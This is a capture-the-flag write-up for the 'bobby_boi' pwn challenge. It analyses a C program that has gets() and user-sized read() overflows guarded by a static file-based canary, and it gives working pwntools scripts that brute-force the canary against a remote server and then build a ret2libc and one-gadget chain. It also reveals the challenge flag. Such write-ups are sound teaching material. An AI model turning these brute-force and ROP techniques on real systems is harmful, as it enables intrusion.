
## bobby_boi (493pt)
### Description

> My boi bobby claims to be the new MC, do you have the bars to  defeat him in a rap battle? Bobby will need the length of your bars  beforehand tho. 
>
> nc 35.238.225.156 1002 
>
> Author: Viper_S


### Attachment

[bobby_boi](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/boot2root/pwn/bobby_boi/bobby_boi)

### Analysis

`og_bars` is used as the **static canary** in this challenge, 

```c
char og_bars[BAR_SIZE];

void read_og_bars(){
    FILE *f = fopen("og_bars.txt", "r");
    if(f == NULL){
        printf("The OG bars are missing, either run the binary on the server or contact admin.\n");
        exit(0);
    }
    fread(og_bars, sizeof(char), BAR_SIZE, f);
    fclose(f);
}
```

and `Stack Smashing Detected` will be triggered while `og_bars` modified. 

```c
if(memcmp(bars, og_bars, BAR_SIZE)){
    printf("*** Stack Smashing Detected ***: The og bars were tampered with.\n");
    exit(-1);
}
```

> NOTE: `Stack Smashing Detected` will **NOT** be triggered if we overwrite `og_bar` to the right value. 

Here are two bof in this challenge :

```c
void rap_battle(){
    char bars[BAR_SIZE];
    char buf[MAXLEN];
    char bar_len[MAXLEN];
    int count, x=0;

    memcpy(bars, og_bars, BAR_SIZE);
    puts("Can you defeat bobby in a rap battle?\n");
    printf("What's the size of your bars?\n");
    while(x<MAXLEN){
        read(0, bar_len+x, 1);
        if (bar_len[x] == '\n') break;
        x++;
    }
    sscanf(bar_len, "%d", &count);

    puts("Spit your bars here: ");

    read(0, buf, count);
    gets(buf);

    if(memcmp(bars, og_bars, BAR_SIZE)){
        printf("*** Stack Smashing Detected ***: The og bars were tampered with.\n");
        exit(-1);
    }
    fflush(stdout);
}
```

### Solution

We can use `read(0, buf, count)` to **brute force** the static canary.

```python
#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *
from sys import argv

local_file  = './bobby_boi'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

elf = ELF(local_file)

# context.log_level = 'debug'
context.arch = elf.arch

def bf(og_bar,c):
    se      = lambda data               :p.send(data) 
    sa      = lambda delim,data         :p.sendafter(delim, data)
    sl      = lambda data               :p.sendline(data)
    sla     = lambda delim,data         :p.sendlineafter(delim, data)
    sea     = lambda delim,data         :p.sendafter(delim, data)
    rc      = lambda numb=4096          :p.recv(numb)
    ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
    uu32    = lambda data               :u32(data.ljust(4, '\0'))
    uu64    = lambda data               :u64(data.ljust(8, '\0'))
    info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

    # p = process(local_file)
    p = remote('35.238.225.156',1002)

    payload = 'A'*36+og_bar+c
    sla('What\'s the size of your bars?\n',str(len(payload)))
    sea('Spit your bars here: \n',payload)
    sl('')
    try:
        data = rc()
        print data
        p.close()
        return -1
    except Exception as e:
        print 'good'
        p.close()
        return c

og_bar = ''
if(len(argv)>1):
    og_bar = argv[1]
table = ' !"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~\n'
while len(og_bar)<=8:
    for c in table:
        res = bf(og_bar,c)
        print 'trying',og_bar+c
        if res != -1:
            og_bar += c
            break
            # pause()
print 'og_bar:', og_bar
```

![](http://image.taqini.space/img/20201206195620.png)

after we know the `canary`, we can easily solve it by ret2libc.

```python
main = 0x000000000040134B

# leak libc and back to main
payload = 'A'*36+'-V1p3R_$'
sla('What\'s the size of your bars?\n',str(len(payload)))
sea('Spit your bars here: \n',payload)
debug()
payload += cyclic(12)
payload += p64(prdi) + p64(elf.got['fopen'])
payload += p64(elf.sym['puts'])
payload += p64(main)
sl(payload)

fopen = uu64(rc(6))
libcbase = fopen - libc.sym['fopen']

og = [283174,283258,983908,987655]

# one gadget
payload = 'A'*36+'-V1p3R_$'
sla('What\'s the size of your bars?\n',str(len(payload)))
sea('Spit your bars here: \n',payload)
payload += cyclic(12)
payload += p64(libcbase+og[0])
sl(payload)
```

> flag: b00t2root{y3Ah_Ye4h_b0bbY_b0y_H3_B3_f33l1n_H1m5elf_SG9taWNpZGU=}

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/boot2root/pwn/bobby_boi) 


